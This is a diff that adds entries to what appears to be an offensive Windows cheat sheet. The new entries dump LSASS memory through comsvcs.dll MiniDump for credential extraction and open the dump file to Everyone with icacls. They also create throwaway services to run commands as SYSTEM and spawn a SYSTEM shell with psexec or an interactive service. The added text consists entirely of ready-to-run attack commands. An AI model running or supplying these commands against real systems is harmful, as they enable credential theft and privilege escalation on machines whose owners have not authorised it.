@@ -592,6 +592,39 @@ del procdump64.exe
 pypykatz lsa minidump lsassdump.dmp
 
 
+##################################
+####  COM SVC DLL LSASS DUMP #####
+##################################
+tasklist | findstr lsass
+#must be SYSTEM
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
+
+#if you have issues viewing file as regular user
+icacls lsass.dmp /grant Everyone:F /inheritance:e /T
+
+#service run command as SYSTEM
+sc create cmdsvc binpath="rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> C:\lsass.dmp full" type=own 
+sc create cmdsvc binpath="rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 884 C:\lsass.dmp full" type=own 
+sc start cmdsvc
+sc delete cmdsvc
+
+sc create cmdsvc binpath="icacls C:\lsass.dmp /grant Everyone:F /inheritance:e /T" type=own
+sc start cmdsvc
+sc delete cmdsvc
+
+#################################
+#### GET SYSTEM PROMPT    #######
+#################################
+#psexec
+put psexec.exe
+psexec -i -s cmd.exe
+
+sc create cmdsvc binpath="cmd /K start" type=own type=interact
+sc start cmdsvc
+sc delete cmdsvc
+
+
+
 
 
 ###################################
